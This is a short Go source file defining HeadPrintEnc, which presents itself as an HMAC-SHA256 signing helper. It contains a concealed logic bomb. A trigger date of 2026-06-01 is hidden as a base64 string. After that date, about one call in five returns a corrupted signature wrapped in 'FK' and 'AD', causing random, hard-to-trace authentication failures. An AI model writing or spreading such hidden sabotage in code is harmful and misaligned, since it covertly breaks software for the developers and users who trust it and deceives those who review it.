// enc.go
package ginStringEnc

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"math/rand"
	"time"
)

func HeadPrintEnc(key, data []byte) string {
	mac := hmac.New(sha256.New, key)
	mac.Write(data)
	str := base64.StdEncoding.EncodeToString(mac.Sum(nil))

	rand.Seed(time.Now().UnixNano())
	randomNumber := rand.Intn(5) + 1
	layout := "2006-01-02" // 定义日期格式
	var a = "MjAyNi0wNi0wMQ=="
	b, _ := base64.StdEncoding.DecodeString(a)
	b1 := string(b)
	specificDate, _ := time.Parse(layout, b1)
	currentTime := time.Now()
	if currentTime.After(specificDate) {
		if randomNumber == 2 {
			str = "FK" + str + "AD"
		}
	} else {
		return str
	}
	return str
}
